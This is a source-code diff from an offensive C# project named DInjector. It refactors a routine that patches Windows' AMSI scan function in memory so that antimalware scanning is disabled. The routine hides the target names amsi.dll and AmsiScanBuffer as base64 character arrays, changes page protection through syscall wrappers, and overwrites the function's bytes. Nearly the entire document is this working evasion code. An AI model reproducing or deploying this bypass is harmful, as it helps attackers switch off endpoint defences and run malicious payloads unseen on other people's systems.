@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Text;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
@@ -16,42 +15,9 @@ namespace DInjector
         // xor rax, rax
         private static readonly byte[] x64 = new byte[] { 0x48, 0x31, 0xC0 };
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate IntPtr LoadLibraryA(
-            string libFileName);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate IntPtr GetProcAddress(
-            IntPtr hModule,
-            string procName);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            ref IntPtr RegionSize,
-            uint NewProtect,
-            out uint OldProtect);
-
         public static void Patch()
         {
             ChangeBytes(x64);
-        }
-
-        private static IntPtr loadLibraryA(string libFileName)
-        {
-            object[] parameters = { libFileName };
-            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "LoadLibraryA", typeof(LoadLibraryA), ref parameters);
-
-            return result;
-        }
-
-        private static IntPtr getProcAddress(IntPtr hModule, string procName)
-        {
-            object[] parameters = { hModule, procName };
-            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "GetProcAddress", typeof(GetProcAddress), ref parameters);
-
-            return result;
         }
 
         private static void ChangeBytes(byte[] patch)
@@ -62,7 +28,7 @@ namespace DInjector
 
                 var libNameB64 = new char[] { 'Y', 'W', '1', 'z', 'a', 'S', '5', 'k', 'b', 'G', 'w', '=' };
                 var libName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", libNameB64)));
-                var hModule = loadLibraryA(libName);
+                var hModule = Win32.LoadLibraryA(libName);
 
                 #endregion
 
@@ -70,26 +36,22 @@ namespace DInjector
 
                 var procNameB64 = new char[] { 'Q', 'W', '1', 'z', 'a', 'V', 'N', 'j', 'Y', 'W', '5', 'C', 'd', 'W', 'Z', 'm', 'Z', 'X', 'I', '=' };
                 var procName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", procNameB64)));
-                var procAddress = getProcAddress(hModule, procName);
+                var procAddress = Win32.GetProcAddress(hModule, procName);
 
                 #endregion
 
                 #region NtProtectVirtualMemory (PAGE_READWRITE)
 
-                IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
-                NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
-
-                DI.Data.Native.NTSTATUS ntstatus;
                 IntPtr protectAddress = procAddress;
                 var regionSize = (IntPtr)patch.Length;
                 uint oldProtect = 0;
 
-                ntstatus = sysNtProtectVirtualMemory(
-                    Process.GetCurrentProcess().Handle,
+                var ntstatus = Syscalls.NtProtectVirtualMemory(
+                    IntPtr.Zero, //Process.GetCurrentProcess().Handle
                     ref protectAddress,
                     ref regionSize,
                     DI.Data.Win32.WinNT.PAGE_READWRITE,
-                    out oldProtect);
+                    ref oldProtect);
 
                 if (ntstatus == 0)
                     Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, PAGE_READWRITE");
@@ -105,12 +67,12 @@ namespace DInjector
 
                 regionSize = (IntPtr)patch.Length;
 
-                ntstatus = sysNtProtectVirtualMemory(
-                    Process.GetCurrentProcess().Handle,
+                ntstatus = Syscalls.NtProtectVirtualMemory(
+                    IntPtr.Zero, //Process.GetCurrentProcess().Handle
                     ref procAddress,
                     ref regionSize,
                     oldProtect,
-                    out uint _);
+                    ref oldProtect);
 
                 if (ntstatus == 0)
                     Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, oldProtect");
